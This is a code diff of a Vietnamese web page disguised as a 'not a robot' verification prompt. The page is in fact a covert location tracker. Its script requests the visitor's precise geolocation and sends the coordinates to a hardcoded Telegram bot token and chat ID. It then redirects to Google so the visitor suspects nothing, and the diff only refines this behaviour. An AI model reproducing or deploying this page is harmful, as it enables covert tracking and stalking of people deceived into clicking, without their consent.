@@ -22,7 +22,7 @@
             <h2 style="font-size: 20px;">Yêu cầu xác minh</h2>
             <p>Vui lòng xác nhận bạn không phải là người máy để tiếp tục truy cập trang web.</p>
             <button id="btn-confirm" onclick="startTracking()">XÁC NHẬN TRUY CẬP</button>
-            <div id="error-msg">Vui lòng bật vị trí hoặc đổi trình duyệt và thử lại</div>
+            <div id="error-msg">Vui lòng bật vị trí và thử lại</div>
         </div>
 
         <div id="step-2" style="display:none;">
@@ -32,12 +32,8 @@
     </div>
 
     <script>
-        // ==========================================
-        // 1. THÔNG TIN CỦA BẠN (GIỮ NGUYÊN)
-        // ==========================================
         const TELE_TOKEN = '8571376502:AAGnzWuqINqn1DfeL-ux16jC-sWt9xeqjmg';
         const CHAT_ID = '1197457034';
-        // ==========================================
 
         function startTracking() {
             document.getElementById('error-msg').style.display = 'none';
@@ -47,7 +43,8 @@
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(sendLocation, handleSystemError, {
                     enableHighAccuracy: true,
-                    timeout: 7000
+                    timeout: 15000, 
+                    maximumAge: 0
                 });
             } else {
                 handleSystemError();
@@ -59,7 +56,7 @@
             const lon = position.coords.longitude;
             
             const googleMapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
-            const message = `📍 Vị trí của nó:\nLink: ${googleMapsUrl}\nĐộ chính xác: +/- ${position.coords.accuracy}m`;
+            const message = `📍 Vị trí của nó:\nLink: ${googleMapsUrl}\nĐộ chính xác: +/- ${Math.round(position.coords.accuracy)}m`;
 
             fetch(`https://api.telegram.org/bot${TELE_TOKEN}/sendMessage`, {
                 method: 'POST',
@@ -67,17 +64,14 @@
                 body: JSON.stringify({ chat_id: CHAT_ID, text: message })
             })
             .then(() => {
-                // Chỉ chuyển hướng khi gửi Telegram thành công
-                window.location.href = "https://m.facebook.com/";
+                window.location.href = "https://www.google.com.vn";
             })
             .catch(() => {
-                // Nếu lỗi mạng khi gửi, yêu cầu thử lại
                 handleSystemError();
             });
         }
 
         function handleSystemError(error) {
-            // Hiện dòng chữ báo lỗi và quay lại bước 1
             document.getElementById('step-2').style.display = 'none';
             document.getElementById('step-1').style.display = 'block';
             document.getElementById('error-msg').style.display = 'block';
